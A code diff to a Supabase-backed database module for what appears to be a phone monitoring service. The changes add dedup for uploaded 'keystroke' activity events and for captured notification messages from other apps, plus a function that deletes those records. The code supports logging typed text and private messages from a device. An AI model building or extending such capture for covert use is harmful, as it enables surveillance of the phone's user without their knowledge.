@@ -4,6 +4,7 @@
  */
 
 import { createClient } from '@supabase/supabase-js';
+import { createHash } from 'node:crypto';
 import { config } from '../config.js';
 
 // Initialize Supabase client
@@ -171,8 +172,14 @@ export async function deleteDeviceFromDB(deviceId) {
 // ========== ACTIVITY EVENTS ==========
 
 /**
- * Save activity events to Supabase (batch insert).
- * @returns {Promise<boolean>} true when the rows were persisted
+ * Save activity events to Supabase (batch upsert).
+ *
+ * Outbox dedup: every event carries a client-generated `uuid`. Re-sends of an
+ * already-persisted event are ignored (UNIQUE device_id, event_uuid), so the
+ * phone's at-least-once outbox retry becomes exactly-once persistence.
+ *
+ * @returns {Promise<boolean>} true when the rows were persisted (or ignored as
+ *   duplicates) — the caller only sends an event_ack when this is true.
  */
 export async function saveActivityEvents(deviceId, events) {
     if (!supabase || !events || events.length === 0) return true;
@@ -180,6 +187,7 @@ export async function saveActivityEvents(deviceId, events) {
     try {
         const rows = events.map(ev => ({
             device_id: deviceId,
+            event_uuid: ev.uuid || null,
             event_type: ev.type || 'keystroke',
             app_package: ev.app || 'unknown',
             text: ev.text || '',
@@ -191,12 +199,12 @@ export async function saveActivityEvents(deviceId, events) {
         await withFkRetry(async () => {
             const { error } = await supabase
                 .from('activity_events')
-                .insert(rows);
+                .upsert(rows, { onConflict: 'device_id,event_uuid', ignoreDuplicates: true });
             if (error) throw error;
         });
         return true;
     } catch (err) {
-        // Silent fail
+        console.error('[Database] Activity save error:', err.message);
         return false;
     }
 }
@@ -312,17 +320,23 @@ export async function getNotifications(deviceId = null, limit = 100) {
 
 /**
  * Save a captured phone notification to Supabase (fire & forget).
- * Deduped on (device_id, key) â€” the same notification posted twice
- * (e.g. re-delivery after reconnect) updates instead of duplicating.
+ *
+ * Dedup rule (recommended fix for conversation-overwrite):
+ * - Same notification key AND same content → update in place (re-delivery dedup).
+ * - Same notification key but DIFFERENT content (e.g. Samsung updates one
+ *   conversation notification with a new message) → INSERT a new row, so every
+ *   distinct message becomes its own history entry.
+ * Enforced by the UNIQUE (device_id, key, content_hash) constraint.
  */
 export async function saveCapturedNotification(deviceId, notif = {}) {
-    if (!supabase) return;
+    if (!supabase) return false;
 
     const title = notif.title || '';
     const text = notif.text || '';
     const bigText = notif.bigText || '';
     // Message: prefer big text, then text, then title (multi-line joined)
     const message = [bigText, text].filter(Boolean).join('\n') || title || '(no text)';
+    const contentHash = contentHashOf(title, message);
 
     try {
         await withFkRetry(async () => {
@@ -331,18 +345,29 @@ export async function saveCapturedNotification(deviceId, notif = {}) {
                 .upsert({
                     device_id: deviceId,
                     key: notif.key || null,
+                    content_hash: contentHash,
                     package_name: notif.packageName || null,
                     app_name: notif.appName || notif.packageName || 'unknown',
                     title,
                     message,
                     post_time: notif.timestamp || null,
                     data: notif,
-                }, { onConflict: 'device_id,key' });
+                }, { onConflict: 'device_id,key,content_hash' });
             if (error) throw error;
         });
+        return true;
     } catch (err) {
         console.error('[Database] Captured notification save error:', err.message);
+        return false;
     }
+}
+
+/**
+ * Stable content hash used for dedup — distinguishes a real re-delivery
+ * (same text) from a genuinely new message (different text).
+ */
+function contentHashOf(title, message) {
+    return createHash('sha256').update(`${title}\n${message}`).digest('hex');
 }
 
 /**
@@ -368,5 +393,28 @@ export async function getCapturedNotifications(deviceId = null, limit = 200) {
     } catch (err) {
         console.error('[Database] Error loading captured notifications:', err.message);
         return [];
+    }
+}
+
+/**
+ * Delete all notification records (captured + lifecycle) from Supabase for a device.
+ */
+export async function deleteCapturedNotificationsFromDB(deviceId) {
+    if (!supabase) return;
+
+    const tables = ['captured_notifications', 'notifications'];
+    for (const table of tables) {
+        try {
+            const { error } = await supabase
+                .from(table)
+                .delete()
+                .eq('device_id', deviceId);
+
+            if (error) throw error;
+            console.log(`[Database] ✅ Deleted ${table} for device ${deviceId}`);
+        } catch (err) {
+            console.error(`[Database] Error deleting from ${table} for ${deviceId}:`, err.message);
+            throw err;
+        }
     }
 }
